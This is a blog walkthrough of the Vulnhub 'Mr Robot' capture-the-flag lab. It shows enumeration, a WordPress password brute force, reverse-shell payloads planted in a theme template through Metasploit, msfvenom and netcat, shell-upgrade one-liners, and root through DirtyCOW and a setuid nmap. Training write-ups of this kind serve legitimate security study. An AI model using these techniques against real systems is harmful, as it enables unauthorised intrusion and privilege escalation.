---
layout: post
title:  "Vulnhub CTF - Mr Robot"
date:   2017-05-28 11:00:00 +11005
categories: vulnhub walkthrough
---

## Mr Robot   

Find the machine here on Vulnhub   

https://www.vulnhub.com/entry/mr-robot-1,151/  
  
  
## Warning  

If you haven't finished getting all three Flags, don't go any further.
Do not ruin it for youself!!

BUT, I have written this for the person who has no idea how to do it, or wants new ideas.  
So if you have downloaded this machine, and completely stuck, I hope this explains things well!  
  
  
## My Setup

>This is for beginners

In this walkthough, I am using ParrotSec.  
I usually use Kali, so hope the pretty terminal looks good in the screenshots!

Not much is needed, I start with a typical 2 terminals, and a text editor for notes.
What you use for notes, be it gedit, sublime, vim, nano, cherrytree, faraday, I don't care, and neither should you. Don't get tied up on the petty.  
Whatever works, works!  

![img]({{ site.github.url }}/images/vulnhub/mrrobot/initsetup.png){:class="img-responsive"}

So I have a few VM's running on my host, but on this network, is just Parrotsec and Mr Robot.  
A quick word on hosts...  
It doesn't matter what you use as a host, honestely.  Again, don't get caught up with petty stuff.

## Enumeration   
### Network  
First, let's find the IP of the Attacking Machine.  
`ifconfig eth0 | grep inet`  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/myip.png){:class="img-responsive"}  

Now, find the target.  
2 good options, i used the latter.  
`nmap -sn 192.168.88.1/24`  
`netdiscover -i eth0 -r 192.168.88.1/24`  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/victimip.png){:class="img-responsive"}  

### Services  
Now we enumerate all the running services.  
For that, I will run a basic nmap.  
`nmap -p- -sV 192.168.88.129`  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/nmap.png){:class="img-responsive"}

So we have a webserver.. Lets start.  

### Port 80  
`curl 192.168.88.129`  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/curl.png){:class="img-responsive"}  
Cute.  
Lets look in a web browser.  

**That is some *DAMN* nice JS there!**  

Anyway, this gives us nothing, so it's time to enumerate this port.
Theres nikto, dirbuster, so on... I'm going to use nikto. A word of warning is that nikto is far far from perfect.  I breaks, comes up with huge amounts of false positives.  But I still like it. 
`nikto --host 192.168.88.129`
![img]({{ site.github.url }}/images/vulnhub/mrrobot/nikto.png){:class="img-responsive"}  


Of all the stuff it brought up, what I really care about is.  
A - robots.txt (always check this)  
B - It has Wordpress, and the login is /wp-admin/  

### robots.txt  
`curl 192.168.88.129/robots.txt`  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/robots.png){:class="img-responsive"}   
Well, that's a give away, let's grab them both with wget.  
`wget 192.168.88.129/fsocity.dic`  
`wget 192.168.88.129/key-1-of-3.txt`  
And lets see out key  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/key1.png){:class="img-responsive"}   


#### wordlist
And the second file, is a wordlist, before I go any further, let's look at it.  
`head` and `tail` are used to peek at it's content, `wc` to see how long it is.    
![img]({{ site.github.url }}/images/vulnhub/mrrobot/dic1.png){:class="img-responsive"}  

858,000 lines, that's enough, let's clean it up of duplicates.  
Sort the file using `sort`, and pipe it to `uniq` to remove the dupes, and redirect stdout to a new file.  
`sort fsocity.dic | uniq > small.dic`  
And now see what size it is.  
`wc small.dic`  
Great, only 11,415 lines!  
Assuming we need this, this a great punishment for the lazy!  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/dic2.png){:class="img-responsive"}  


#### Wordpress
##### Wordpress Vulnerability Scan
Run wpscan on it.  
`wpscan -e vp,vt -u 192.168.88.129`  
No point showing it's use printout, but the point that matters is.  

```
[!] Title: All-in-One WP Migration <= 2.0.4 - Unauthenticated Database Export
    Reference: https://wpvulndb.com/vulnerabilities/7857
    Reference: http://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability
    Reference: https://www.rapid7.com/db/modules/auxiliary/gather/wp_all_in_one_migration_export
[i] Fixed in: 2.0.5
```  

And it has a metasploit module, let's try that!   
Since we are firing up metasploit, we need to make sure postgresql is running.  
`/etc/init.d/postgresql start`  
Now, metasploit.  `msfconsole`  

Finding the module is first, so we will search for it.  
`search wp_all_in` should be fine.  And we have found it, let's use it.  
`use auxiliary/gather/wp_all_in_one_migration_export`  
To view how to use this module.  
`show info`  
We can see all the settings, all we need to change is the rhost, so, let's do that!  
`set rhost 192.168.88.129`  
and then `run` (`exploit` also works)  
And it looks like it was successful!!
![img]({{ site.github.url }}/images/vulnhub/mrrobot/msf1.png){:class="img-responsive"}  
let's check the file.  
doing a quick `ls -al` shows the file is empty.  This did not work!
Let's not waste time, let's move on!

##### Wordpress Brute Force

It is very common for wordpress to have weak, and I mean, really weak logins.
admin:admin, admin:password, so on.  
And no way!!!  How verbose is this error!  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/wp1.png){:class="img-responsive"}  

Let's think along the social engineering route before we go the brute force route.  
By that I mean, brute force route is getting a wordlist full of given names and common user names.   
The Social Engineering route is, the machine is themed Mr Robot.  
So, we have *robot*, *eliot*, *fsociety*, so on..  lets do this manually to begin with!  
And it's a win!  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/wp2.png){:class="img-responsive"}  

Now, the password.   Elliot wasn't a nub, so let's used that supplied password list.  
`wpscan -u 192.168.88.129 --username elliot --wordlist /root/vulnhub/mrrobot/small.dic`  
Okay, 2 minutes to go through this list.  Think back how big this file was.  This could have taken nearly 80 times longer, 3 hours or so.   And it would have taken that long, because, look at the `tail` from above, and the password it was from below!  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/wp3.png){:class="img-responsive"}  

So we have elliots password!

##### Wordpress Reverse Shell  

Wordpress just loves to give reverse shells!  
Theres so many ways.  
Let's look at a few!  

First, we have meterpreter still open, it can do it entirely.  
##### Wordpress Reverse Shell - Meterpreter

There is a module, `use exploit/unix/webapp/wp_admin_shell_upload`   
Have a read.  I tried it, it didn't work, I didn't care and went to move on, but then though making it work would be useful for you kiddies reading this, so.

![img]({{ site.github.url }}/images/vulnhub/mrrobot/wpf.png){:class="img-responsive"}  


>**Note**
>You need to know vi, I am not going to teach you vi, but it is EASY.
>Just learn the basics.

![img]({{ site.github.url }}/images/vulnhub/mrrobot/wp4.png){:class="img-responsive"}  
That failwith line, we don't want.  Not that it's not a fault with the plugin, this is just a unique site, so for simplicity, just remove it.  
In metasploit framework, type `reload` followed by `run`.  
Guess what, we have a meterpreter shell!   

![img]({{ site.github.url }}/images/vulnhub/mrrobot/wp5.png){:class="img-responsive"}  

##### Wordpress Reverse Shell - Manual
Again, there is so many ways of doing this, it's crazy, so heres another.  
Using msfvenom, I create a reverse php shell.  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/msfv.png){:class="img-responsive"}  

Login to wordpress, go appearance, Editor, and pick one, for this example, I used page 404.  
Chuck the payload in there (note I changed the port)  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/msfv2.png){:class="img-responsive"}  

Set up a reverse handler in metasploit as such.
`use exploit/multi/handler`  
`set payload php/meterpreter/reverse_tcp`  
and all the settings as needed, remember, `show info`  
and run it with `run`  

And browse to a page.  randomly, to get a 404.  
`curl 192.168.88.129/ojuns`  

And.....  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/msfv3.png){:class="img-responsive"}  
Another shell!  

##### Reverse Shell with netcat
Google for php reverse shell, do something similar, edit a php page and put the payload in there.
Instead of metasploit, use netcat.  `nc -nlvp 4444` for example.  
I won't show an example of this, as the procudure is identical, and if anything, the metasploit method is more complex.  

#### Shell  

Now we have a shell, it's time to look around, let's look where we are.  
>If you are using a meterpreter shell, just drop to shell using `shell`  
 
Look around, have fun, theres another little gift here too!  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/never.png){:class="img-responsive"}  

First, I look in home.... habit, let's just call it that!  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/a1.png){:class="img-responsive"}  

Our second key, nice, not that we can read it (remember, we are daemon, and this is owned by robot), but we can access the hash.  
No one would ever do this, but anyway.
```
cat passwor*
robot:c3fcd3d76192e4007dfb496cca67e13b
```  

It is a MD5 hash as claimed, let's try google, incase it's in a rainbow table somewhere.  
And it has!  
`abcdefghijklmnopqrstuvwxyz`   

let's login as root... but we can't.  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/nonint.png){:class="img-responsive"}  
We need tty!  

#### Getting an interactive shell

Theres lot's of ways again, my favorites are these..
`python -c 'import pty; pty.spawn("/bin/sh")'`  
`perl —e 'exec "/bin/sh";'`  
`/bin/sh -i`     
`echo os.system('/bin/bash')`   
within vi: `:!bash`   
within nmap: `!sh`  

So, let's start from the top, until we get some luck!  

And python delivered... on we go.  

#### Access Level Robot  
Using the new shell, let's log in as robot.  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/robot.png){:class="img-responsive"}  

And grab our little treasure!  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/key2.png){:class="img-responsive"}  

Now, we need to get to root!  
a quick hit at sudo said robot isn't in sudoers group.  
So we need to find another way.

#### Getting root
##### Exploit
Let's use the infamous dirtyCOW since we know this is kernel is vulnerable.  
Search the exploit-db for the exploit.  
`searchsploit dirty`  
great, now, let's upload it to the machine using meterpreter.  
ctrl+z to background the channel.  
Get the local and remote directories where we want them.  
Upload the file using `upload`.  
Go back to our channel using `channel -i 1` (Note, screenshot shows 0, that was my error, I had to re-run it)  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/exploit1.png){:class="img-responsive"}  
Now we have got the file, we compile it as instructed.  
Make it executeable `chmod +x dcow`  
Run it `./dcow`  
Log in as root `su -`  
Do the **root dance**!
![img]({{ site.github.url }}/images/vulnhub/mrrobot/exploit2.png){:class="img-responsive"}  
 
 
##### Misconfiguration (likely intentional)  
When this box was created, dirtyCOW was now know of, there IS another way.  
We look at processes using `ps auxw`, we look for setuid bits on files .......  
This one was a winner, have a look!  
`find / -perm -4000 -type f 2>/dev/null`   
![img]({{ site.github.url }}/images/vulnhub/mrrobot/misc.png){:class="img-responsive"}  

This is great because of nmap.  Well... Maybe.  
Older versions of nmap had an interactive shell, let's try it.  

`nmap --interactive`  
Just follow the screenshot, yes, that easy!  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/misc2.png){:class="img-responsive"}  

#### Trophy  
That's, time for the last trophy.  
![img]({{ site.github.url }}/images/vulnhub/mrrobot/key3.png){:class="img-responsive"}  


## Final Words  
Thanks for this machine Jason, very well thought out.  

Hope you enjoyed the walkthrough.

ku7

